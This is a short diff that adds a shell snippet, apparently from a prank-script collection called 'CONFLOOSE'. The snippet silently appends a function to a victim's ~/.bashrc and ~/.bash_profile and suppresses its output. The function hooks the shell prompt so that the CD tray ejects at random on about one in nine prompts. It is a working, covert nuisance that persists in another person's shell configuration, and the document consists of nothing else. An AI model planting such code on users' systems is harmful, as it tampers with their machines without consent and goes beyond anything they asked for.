@@ -1,0 +1,14 @@
+prompt_options
+
+tee -a ~/.bashrc ~/.bash_profile 2>&1 1>/dev/null <<-EOF
+# === CONFLOOSE === #
+random_eject()
+{
+    if [ \$(( RANDOM % 9 )) -eq 0 ]; then
+        eject -T
+    fi
+}
+
+PROMPT_COMMAND="random_eject; \$PROMPT_COMMAND"
+# ================= #
+EOF
